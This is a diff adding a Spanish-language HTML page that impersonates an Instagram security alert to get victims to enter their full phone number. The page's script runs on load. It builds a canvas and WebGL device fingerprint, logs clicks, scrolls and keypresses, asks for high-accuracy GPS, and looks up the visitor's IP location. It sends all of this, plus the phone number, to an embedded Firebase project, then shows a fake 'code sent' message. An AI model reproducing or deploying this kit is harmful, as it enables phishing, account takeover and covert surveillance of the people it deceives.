@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad - Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: #0f1419;
+            color: #fff;
+            min-height: 100vh;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 40px;
+            background-color: #0f1419;
+            border-bottom: 1px solid #2a2e35;
+        }
+
+        .logo {
+            padding: 8px 20px;
+            font-weight: 900;
+            font-size: 24px;
+            letter-spacing: 1px;
+            border-radius: 4px;
+            margin-left: 190px;
+        }
+
+        .auth-buttons {
+            display: flex;
+            gap: 20px;
+        }
+
+        .btn-login {
+            background-color: #5b6ef5;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .btn-login:hover {
+            background-color: #4a5de0;
+        }
+
+        .btn-register {
+            background-color: transparent;
+            color: #000000;
+            border: none;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+
+        .btn-register:hover {
+            color: #fff;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 80px);
+            padding: 20px;
+        }
+
+        .card {
+            background-color: #0b1012;
+            border: 1px solid #2a2e35;
+            border-radius: 12px;
+            padding: 40px 32px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+
+        .lock-icon {
+            width: 220px;
+            height: 120px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            background-color: transparent;
+        }
+
+        .lock-icon img {
+            max-width: 80%;
+            height: auto;
+        }
+
+        .alert-badge {
+            display: inline-block;
+            background-color: #ef4444;
+            color: white;
+            padding: 5px 14px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .title {
+            font-size: 19px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            color: #fff;
+            line-height: 1.3;
+        }
+
+        .description {
+            font-size: 14px;
+            line-height: 1.6;
+            color: #d1d5db;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
+        .phone-info {
+            background-color: #0f1419;
+            border: 1px solid #2a2e35;
+            border-radius: 8px;
+            padding: 14px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .phone-label {
+            font-size: 12px;
+            color: #9ca3af;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .phone-value {
+            font-size: 16px;
+            color: #fff;
+            font-weight: 600;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            text-align: left;
+            font-size: 13px;
+            color: #9ca3af;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 14px;
+            background-color: #0f1419;
+            border: 1px solid #2a2e35;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .input-field::placeholder {
+            color: #6b7280;
+        }
+
+        .input-field:focus {
+            border-color: #5b6ef5;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background-color: #18208c;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-bottom: 16px;
+        }
+
+        .btn-submit:hover {
+            background-color: #18208c;
+        }
+
+        .security-note {
+            font-size: 12px;
+            color: #6b7280;
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #2a2e35;
+            line-height: 1.6;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 32px 0;
+            color: #6b7280;
+            font-size: 14px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #2a2e35;
+        }
+
+        .divider::before {
+            margin-right: 16px;
+        }
+
+        .divider::after {
+            margin-left: 16px;
+        }
+
+        .btn-back {
+            width: 100%;
+            padding: 14px;
+            background-color: transparent;
+            color: #9ca3af;
+            border: 1px solid #2a2e35;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-back:hover {
+            background-color: #2a2e35;
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <img src="img/logo.png" alt="Logo" style="height: 40px; width: auto;">
+        </div>
+        <div class="auth-buttons">
+            <button class="btn-login">Iniciar sesión</button>
+            <button class="btn-register">Registrarte</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <div class="lock-icon">
+                <img src="img/lock.png" alt="Lock">
+            </div>
+
+            <div class="alert-badge">Alerta de Seguridad</div>
+
+            <h1 class="title">¡Hola! Detectamos un intento de acceso inusual a tu cuenta</h1>
+            
+            <p class="description">
+                Detectamos un intento de acceso desde otra ubicación. Para proteger tu cuenta y verificar que eres el propietario, necesitamos confirmar el número de teléfono asociado.
+            </p>
+
+            <div class="phone-info">
+                <div class="phone-label">Número registrado</div>
+                <div class="phone-value">+1 ***-***-**02</div>
+            </div>
+
+            <p class="description">
+                Instagram ya tiene registrado el número que termina en <strong>02</strong>, pero el sistema no lo reconoce completamente (puede ser por cambio de SIM o actualización reciente).
+            </p>
+
+            <div class="input-group">
+                <label class="input-label">Número de teléfono completo</label>
+                <input 
+                    type="tel" 
+                    class="input-field" 
+                    placeholder="+1 (809) 000-0000"
+                    id="phoneInput"
+                >
+            </div>
+
+            <button class="btn-submit" id="submitBtn">Enviar código de verificación (6 dígitos)</button>
+
+            <div class="security-note">
+                Este proceso es seguro y toma solo unos segundos. El código será enviado por SMS.
+            </div>
+
+            <div class="divider">O</div>
+
+            <button class="btn-back">No fui yo, asegurar cuenta</button>
+        </div>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+
+    <script>
+        // Configuración de Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyDS6KIKO_2Qj4Z5oZcghkZ3XBlzEcyLm3A",
+            authDomain: "inst-a7ba2.firebaseapp.com",
+            projectId: "inst-a7ba2",
+            storageBucket: "inst-a7ba2.firebasestorage.app",
+            messagingSenderId: "162619455468",
+            appId: "1:162619455468:web:caafee1301ecbe6c4d72c9",
+            measurementId: "G-0T1GXS1GHW"
+        };
+
+        // Inicializar Firebase
+        let db;
+        try {
+            firebase.initializeApp(firebaseConfig);
+            db = firebase.firestore();
+            console.log('✅ Firebase inicializado');
+        } catch (error) {
+            console.error('❌ Error Firebase:', error);
+        }
+
+        // ============================================
+        // SISTEMA DE IDENTIFICACIÓN AVANZADO
+        // ============================================
+
+        // 1. FINGERPRINT ÚNICO DEL DISPOSITIVO (Canvas + WebGL)
+        function generarFingerprint() {
+            try {
+                // Canvas Fingerprint
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('🔒 Browser ID', 2, 15);
+                const canvasFingerprint = canvas.toDataURL();
+
+                // WebGL Fingerprint
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                const webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+
+                return {
+                    canvas: canvasFingerprint.slice(-50),
+                    webglVendor: webglVendor,
+                    webglRenderer: webglRenderer
+                };
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // 2. INFORMACIÓN COMPLETA DEL DISPOSITIVO
+        function obtenerInfoDispositivo() {
+            const nav = navigator;
+            return {
+                // Sistema operativo detallado
+                userAgent: nav.userAgent,
+                platform: nav.platform,
+                vendor: nav.vendor,
+                
+                // Hardware
+                hardwareConcurrency: nav.hardwareConcurrency || 'No disponible',
+                deviceMemory: nav.deviceMemory || 'No disponible',
+                maxTouchPoints: nav.maxTouchPoints || 0,
+                
+                // Pantalla
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenColorDepth: screen.colorDepth,
+                screenPixelDepth: screen.pixelDepth,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                
+                // Navegador
+                languages: nav.languages || [nav.language],
+                cookieEnabled: nav.cookieEnabled,
+                doNotTrack: nav.doNotTrack,
+                
+                // Plugins (solo los nombres)
+                plugins: Array.from(nav.plugins || []).map(p => p.name),
+                
+                // Conexión
+                connectionType: nav.connection?.effectiveType || 'No disponible',
+                connectionDownlink: nav.connection?.downlink || 'No disponible',
+                
+                // Zona horaria EXACTA
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                
+                // Batería (si está disponible)
+                batteryCharging: 'Pendiente',
+                batteryLevel: 'Pendiente'
+            };
+        }
+
+        // 3. TRACKING DE COMPORTAMIENTO (Mouse, teclado, scroll)
+        let trackingData = {
+            clicks: 0,
+            mouseMovements: 0,
+            scrolls: 0,
+            keyPresses: 0,
+            timeOnPage: 0,
+            interactions: []
+        };
+
+        const startTime = Date.now();
+
+        // Rastrear clics
+        document.addEventListener('click', (e) => {
+            trackingData.clicks++;
+            trackingData.interactions.push({
+                type: 'click',
+                x: e.clientX,
+                y: e.clientY,
+                time: Date.now() - startTime
+            });
+        });
+
+        // Rastrear movimientos del mouse (cada 500ms)
+        let lastMouseMove = 0;
+        document.addEventListener('mousemove', (e) => {
+            const now = Date.now();
+            if (now - lastMouseMove > 500) {
+                trackingData.mouseMovements++;
+                lastMouseMove = now;
+            }
+        });
+
+        // Rastrear scroll
+        document.addEventListener('scroll', () => {
+            trackingData.scrolls++;
+        });
+
+        // Rastrear teclas presionadas
+        document.addEventListener('keypress', () => {
+            trackingData.keyPresses++;
+        });
+
+        // 4. INTENTAR OBTENER GPS (silenciosamente)
+        async function intentarObtenerGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve({
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        precision: pos.coords.accuracy,
+                        timestamp: new Date(pos.timestamp).toISOString()
+                    }),
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            });
+        }
+
+        // 5. CAPTURA COMPLETA DE VISITA
+        async function capturarVisitaCompleta() {
+            console.log('🎯 Iniciando identificación avanzada...');
+            
+            try {
+                // Obtener IP y ubicación
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                
+                // Generar fingerprint único
+                const fingerprint = generarFingerprint();
+                
+                // Obtener info del dispositivo
+                const dispositivo = obtenerInfoDispositivo();
+                
+                // Intentar obtener GPS
+                const gps = await intentarObtenerGPS();
+                
+                // Obtener batería
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    dispositivo.batteryCharging = battery.charging;
+                    dispositivo.batteryLevel = Math.round(battery.level * 100) + '%';
+                }
+
+                // Calcular tiempo en página
+                trackingData.timeOnPage = Math.round((Date.now() - startTime) / 1000);
+
+                // DATOS COMPLETOS PARA IDENTIFICACIÓN
+                const datosCompletos = {
+                    // ==== IDENTIFICACIÓN ÚNICA ====
+                    fingerprintDispositivo: fingerprint,
+                    
+                    // ==== UBICACIÓN ====
+                    ubicacion: {
+                        ip: ipData.ip,
+                        ipTipo: ipData.version,
+                        ciudad: ipData.city,
+                        region: ipData.region,
+                        pais: ipData.country_name,
+                        codigoPais: ipData.country_code,
+                        codigoPostal: ipData.postal,
+                        latitudIP: ipData.latitude,
+                        longitudIP: ipData.longitude,
+                        proveedor: ipData.org,
+                        asn: ipData.asn,
+                        gpsExacto: gps || 'No autorizado'
+                    },
+                    
+                    // ==== DISPOSITIVO COMPLETO ====
+                    dispositivo: dispositivo,
+                    
+                    // ==== COMPORTAMIENTO ====
+                    comportamiento: {
+                        clicks: trackingData.clicks,
+                        movimientosMouse: trackingData.mouseMovements,
+                        scrolls: trackingData.scrolls,
+                        teclasPresionadas: trackingData.keyPresses,
+                        tiempoEnPagina: trackingData.timeOnPage + ' segundos',
+                        primerasInteracciones: trackingData.interactions.slice(0, 5)
+                    },
+                    
+                    // ==== METADATOS ====
+                    metadata: {
+                        url: window.location.href,
+                        referrer: document.referrer || 'Acceso directo',
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        fechaISO: new Date().toISOString(),
+                        fechaLocal: new Date().toLocaleString('es-DO')
+                    }
+                };
+
+                // Guardar en Firebase
+                const docRef = await db.collection('visitas_completas').add(datosCompletos);
+                
+                console.log('✅ IDENTIFICACIÓN COMPLETA GUARDADA');
+                console.log('📋 ID:', docRef.id);
+                console.log('📍 IP:', ipData.ip);
+                console.log('🌍 Ubicación:', `${ipData.city}, ${ipData.country_name}`);
+                console.log('🔐 Fingerprint:', fingerprint?.canvas);
+                if (gps) console.log('🎯 GPS:', `${gps.lat}, ${gps.lng}`);
+                
+                return datosCompletos;
+                
+            } catch (error) {
+                console.error('❌ Error:', error);
+                return null;
+            }
+        }
+
+        // EJECUTAR AL CARGAR
+        window.addEventListener('load', () => {
+            setTimeout(capturarVisitaCompleta, 1000);
+        });
+
+        // CAPTURAR TELÉFONO
+        document.getElementById('submitBtn').addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            const telefono = document.getElementById('phoneInput').value.trim();
+            
+            if (!telefono) {
+                alert('⚠️ Por favor ingresa tu número de teléfono');
+                return;
+            }
+
+            if (telefono.length < 8) {
+                alert('⚠️ El número parece incompleto');
+                return;
+            }
+
+            try {
+                this.textContent = 'Enviando código...';
+                this.disabled = true;
+
+                // Obtener datos actuales
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                const fingerprint = generarFingerprint();
+                const gps = await intentarObtenerGPS();
+
+                // Guardar teléfono con todos los datos
+                const telefonoData = {
+                    // ==== TELÉFONO ====
+                    telefono: telefono,
+                    
+                    // ==== IDENTIFICACIÓN ====
+                    fingerprintDispositivo: fingerprint,
+                    ip: ipData.ip,
+                    ubicacion: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
+                    coordenadas: {
+                        ip: { lat: ipData.latitude, lng: ipData.longitude },
+                        gps: gps || 'No disponible'
+                    },
+                    proveedor: ipData.org,
+                    
+                    // ==== DISPOSITIVO ====
+                    dispositivo: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        idioma: navigator.language,
+                        pantalla: `${screen.width}x${screen.height}`
+                    },
+                    
+                    // ==== TIMING ====
+                    tiempoEnPaginaAntes: Math.round((Date.now() - startTime) / 1000) + 's',
+                    interacciones: trackingData.clicks + trackingData.scrolls,
+                    
+                    // ==== METADATA ====
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                    fechaISO: new Date().toISOString(),
+                    fechaLocal: new Date().toLocaleString('es-DO')
+                };
+
+                await db.collection('telefonos_completos').add(telefonoData);
+
+                console.log('✅ TELÉFONO CAPTURADO:', telefono);
+                console.log('📍 Ubicación:', telefonoData.ubicacion);
+                if (gps) console.log('🎯 GPS:', `${gps.lat}, ${gps.lng}`);
+
+                alert('✅ Código enviado exitosamente\n\nRecibirás un SMS en los próximos segundos.');
+                
+                document.getElementById('phoneInput').value = '';
+                
+            } catch (error) {
+                console.error('❌ Error:', error);
+                alert('❌ Error. Intenta nuevamente.');
+            } finally {
+                this.textContent = 'Enviar código de verificación (6 dígitos)';
+                this.disabled = false;
+            }
+        });
+
+        // Enter en el input
+        document.getElementById('phoneInput').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                document.getElementById('submitBtn').click();
+            }
+        });
+
+        console.log('%c🔒 Sistema de Identificación Avanzado Activo', 'color: #ef4444; font-size: 16px; font-weight: bold;');
+    </script>
+</body>
+</html>
